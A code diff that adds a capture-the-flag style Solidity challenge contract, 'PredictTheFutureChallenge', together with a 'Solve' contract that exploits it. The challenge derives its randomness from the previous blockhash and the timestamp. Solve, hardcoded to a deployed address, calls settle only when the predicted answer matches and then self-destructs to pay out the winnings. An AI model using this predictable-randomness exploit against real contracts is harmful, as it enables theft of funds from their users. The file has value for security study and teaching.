@@ -1,0 +1,66 @@
+pragma solidity ^0.4.21;
+
+contract PredictTheFutureChallenge {
+    address guesser;
+    uint8 guess;
+    uint256 settlementBlockNumber;
+
+    function PredictTheFutureChallenge() public payable {
+        require(msg.value == 1 ether);
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function lockInGuess(uint8 n) public payable {
+        require(guesser == 0);
+        require(msg.value == 1 ether);
+
+        guesser = msg.sender;
+        guess = n;
+        settlementBlockNumber = block.number + 1;
+    }
+
+    function settle() public {
+        require(msg.sender == guesser);
+        require(block.number > settlementBlockNumber);
+
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+
+        guesser = 0;
+        if (guess == answer) {
+            msg.sender.transfer(2 ether);
+        }
+    }
+}
+
+#send 1 ether when create new contract Solve then destroy it to receive the rewards
+
+contract Solve {
+    address contractPTF = 0x88b570e64B871bA9153e395a76D0e45B4c879E56;
+    address owner;
+    uint8 answer = 5;
+    
+    PredictTheFutureChallenge target = PredictTheFutureChallenge(contractPTF);
+    
+    function Solve() public payable {
+        owner = msg.sender;
+    }
+    
+    function() public payable {
+    }
+    
+    function callLockInGuess() public payable {
+        target.lockInGuess.value(1 ether)(answer);
+    }
+    
+    function solveGuess() public payable {
+        require (answer == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10);
+        target.settle();
+    }
+    
+    function destroy() public {
+        selfdestruct(owner);
+    }
+}
